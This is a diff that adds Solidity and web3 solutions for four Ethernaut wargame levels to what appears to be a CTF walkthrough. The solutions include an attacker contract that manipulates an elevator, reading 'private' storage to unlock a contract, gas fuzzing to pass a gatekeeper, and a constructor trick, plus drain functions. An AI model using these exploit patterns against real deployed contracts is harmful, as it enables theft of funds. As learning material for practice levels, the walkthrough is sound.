@@ -223,3 +223,133 @@ contract Withdrawer {
 ```
 
 </details> 
+
+
+<details>
+    <summary>☝️ Level 11 - Elevator</summary>
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+interface Elevator {
+  function goTo(uint _floor) external;
+}
+
+contract Building {
+    Elevator instance = Elevator(address(...));
+    
+    bool answer = true;
+    
+  function isLastFloor(uint) external returns (bool) {
+      answer = !answer;
+      return answer;
+  }
+ 
+  function justDoIt() public {
+      instance.goTo(42);
+  }
+}
+```
+
+</details> 
+
+<details>
+    <summary>🤫 Level 12 - Privacy</summary>
+
+```javascript
+// read where data[2] is stored (in the fifth slot since there is some 
+packing of smaller arguments going on):
+
+await web3.eth.getStorageAt(instance, 5)
+
+-> "0x658df6fba159ec7a1e678c38c33e7a77dd541772c97aeed1ad580b033885e238"
+
+// turn that into a bytes16, which means calling unlock with the first half:
+
+await contract.unlock('0x658df6fba159ec7a1e678c38c33e7a77')
+
+```
+
+</details> 
+
+<details>
+    <summary>💂‍♂️ Level 13 - Gatekeeper one</summary>
+
+For the key value itself, need to replace the last 2 bytes with the end of the address used to send the transaction.
+
+```solidity
+// SPDX-License-Identifier: GPL-3.0
+
+pragma solidity >=0.7.0 <0.9.0;
+
+interface GatekeeperOne {
+  function enter(bytes8 _gateKey) external returns(bool);
+}
+
+contract Enterer {
+    GatekeeperOne instance = GatekeeperOne(address(...));
+    event ErrorLog(string reason);
+
+    // getting the gas left just right was difficult, I took some inspiration online to "fuzz" with the for loop
+    function pullTheTrigger() public returns(bool) {
+        for (uint256 i = 0; i < 120; i++) {
+          try instance.enter{gas:i + 150 + 8191 * 3}(0xffffffff0000....) returns(bool result) {
+              if (result) {
+                  return result;
+              }
+          } catch Error(string memory reason) {
+            emit ErrorLog(reason);
+          } catch (bytes memory /*lowLevelData*/) {
+            // This is executed in case revert() was used.
+            emit ErrorLog("not the right amount of gas");
+          }
+        }
+        return false;
+    }
+    
+    function drain() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+```
+
+</details> 
+
+<details>
+    <summary>🐕 Level 14 - Gatekeeper two</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+
+// this is important, with newer Solidity versions, 
+// `uint64(0) - 1` will fail because it relies on an underflow
+pragma solidity ^0.6.0; 
+
+interface GatekeeperTwo {
+  function enter(bytes8 _gateKey) external returns(bool);
+}
+
+contract Enterer {
+    constructor() public {
+        uint64 hashedMe = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+        uint64 key = ~hashedMe;
+        uint64 expected = uint64(0) - 1;
+        
+        require(hashedMe ^ key == expected, "wrong key");
+        
+        GatekeeperTwo instance = GatekeeperTwo(address(...));
+        instance.enter(bytes8(key));
+    }
+    
+    function drain() public {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+```
+
+</details> 
+
